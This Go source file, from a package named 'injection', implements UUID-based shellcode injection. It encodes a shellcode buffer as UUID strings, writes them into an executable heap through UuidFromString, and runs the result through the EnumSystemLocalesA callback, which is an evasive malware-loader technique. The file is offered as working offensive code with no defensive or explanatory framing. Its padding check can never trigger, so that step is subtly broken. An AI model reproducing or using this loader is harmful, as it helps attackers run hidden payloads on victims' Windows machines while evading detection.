package injection

import (
	"bytes"
	"encoding/binary"
	"unsafe"

	"github.com/google/uuid"
)

func UUIDFromString() {
	uuids := shellcodeToUUID(shellcode)

	heapAddr, _, _ := HeapCreate.Call(0x00040000, 0, 0)

	addr, _, _ := HeapAlloc.Call(heapAddr, 0, 0x00100000)

	addrPtr := addr
	for _, uuid := range uuids {
		u := append([]byte(uuid), 0)
		UuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		addrPtr += 16
	}

	EnumSystemLocalesA.Call(addr, 0)
}

func shellcodeToUUID(shellcode []byte) []string {
	if 16-len(shellcode)%16 > 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, _ := uuid.FromBytes(uuidBytes)

		uuids = append(uuids, u.String())
	}
	return uuids
}
